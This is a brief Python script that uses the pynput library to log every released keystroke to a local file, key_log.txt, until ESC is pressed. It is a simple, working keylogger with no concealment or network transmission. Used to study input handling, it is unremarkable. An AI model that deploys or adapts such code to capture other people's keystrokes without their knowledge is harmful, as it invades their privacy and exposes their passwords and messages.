from pynput import keyboard

# Open the file in append mode and write session start
with open("key_log.txt", "a") as f:
    f.write("\n\nNew session started\n")

def on_release(key):
    key_str = str(key).replace("'", "")  # Convert key to string and remove quotes
    if key == keyboard.Key.esc:  # Check for ESC key
        return False
    # Open the file, append the key, and close the file
    with open("key_log.txt", "a") as f:
        f.write(key_str)

# Set up the listener for keyboard events
with keyboard.Listener(on_release=on_release) as listener:
    listener.join()